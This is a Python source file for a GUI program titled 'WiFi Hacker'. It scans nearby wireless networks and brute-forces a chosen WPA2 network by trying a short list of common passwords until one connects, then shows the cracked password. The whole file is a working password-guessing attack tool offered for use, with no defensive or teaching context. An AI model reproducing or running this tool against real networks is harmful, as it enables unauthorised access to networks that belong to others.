# top/dwgx/Modules/WiFiHacker.py
import sys
import time
import itertools
import comtypes.client  # Ensure this import works
#不知道啊傻逼我是网卡
from PySide6.QtWidgets import QWidget, QPushButton, QVBoxLayout, QHBoxLayout, QListWidget, QMessageBox, QApplication
from PySide6.QtCore import QThread, Signal
import pywifi
from pywifi import const


class WiFiScannerThread(QThread):
    result_signal = Signal(list)

    def run(self):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(3)
        scan_results = iface.scan_results()
        wifi_list = [(network.ssid, network.signal) for network in scan_results]
        self.result_signal.emit(wifi_list)


class WiFiCrackerThread(QThread):
    success_signal = Signal(str)
    failure_signal = Signal(str)

    def __init__(self, ssid, password_list):
        super().__init__()
        self.ssid = ssid
        self.password_list = password_list

    def run(self):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        profile = pywifi.Profile()

        profile.ssid = self.ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        for password in self.password_list:
            profile.key = password
            iface.remove_all_network_profiles()
            iface.connect(iface.add_network_profile(profile))
            time.sleep(2)
            if iface.status() == const.IFACE_CONNECTED:
                self.success_signal.emit(password)
                return
        self.failure_signal.emit("Failed to crack the password")


class WiFiHacker(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi Hacker")
        self.resize(400, 300)

        self.layout = QVBoxLayout(self)

        self.scan_button = QPushButton("Scan WiFi Networks")
        self.scan_button.clicked.connect(self.scan_wifi)
        self.layout.addWidget(self.scan_button)

        self.wifi_list_widget = QListWidget()
        self.layout.addWidget(self.wifi_list_widget)

        self.crack_button = QPushButton("Crack Selected WiFi")
        self.crack_button.clicked.connect(self.crack_wifi)
        self.layout.addWidget(self.crack_button)

        self.scanner_thread = WiFiScannerThread()
        self.scanner_thread.result_signal.connect(self.display_wifi_list)

        self.cracker_thread = None

    def scan_wifi(self):
        self.wifi_list_widget.clear()
        self.scanner_thread.start()

    def display_wifi_list(self, wifi_list):
        for ssid, strength in wifi_list:
            self.wifi_list_widget.addItem(f"{ssid} (Signal: {strength})")

    def crack_wifi(self):
        selected_items = self.wifi_list_widget.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No WiFi Selected", "Please select a WiFi network to crack.")
            return
        ssid = selected_items[0].text().split(" (")[0]

        password_list = self.generate_password_list()
        self.cracker_thread = WiFiCrackerThread(ssid, password_list)
        self.cracker_thread.success_signal.connect(self.on_success)
        self.cracker_thread.failure_signal.connect(self.on_failure)
        self.cracker_thread.start()

    def on_success(self, password):
        QMessageBox.information(self, "Success", f"WiFi password cracked: {password}")
        self.cracker_thread = None

    def on_failure(self, message):
        QMessageBox.warning(self, "Failure", message)
        self.cracker_thread = None

    def generate_password_list(self):
        # Example: Generate a simple password list
        # In a real scenario, passwords could be loaded from a file or another source
        return ['password', '12345678', 'qwerty', 'letmein', 'admin']


def main():
    app = QApplication(sys.argv)
    window = WiFiHacker()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
